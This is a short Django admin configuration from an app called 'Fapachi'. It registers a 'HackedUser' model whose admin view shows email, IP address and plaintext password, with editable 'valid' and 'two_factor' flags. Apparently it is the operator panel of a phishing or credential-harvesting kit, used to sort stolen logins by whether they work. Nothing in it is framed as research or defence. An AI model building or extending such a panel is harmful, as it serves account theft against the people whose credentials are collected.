from django.contrib import admin

# Register your models here.
from Fapachi.models import RequestUser, HackedUser


class AdminHackedUser(admin.ModelAdmin):
    list_display = ("email","ip","password","valid","two_factor")
    list_editable = ("valid","two_factor")

admin.site.register(HackedUser,AdminHackedUser)
admin.site.register(RequestUser)
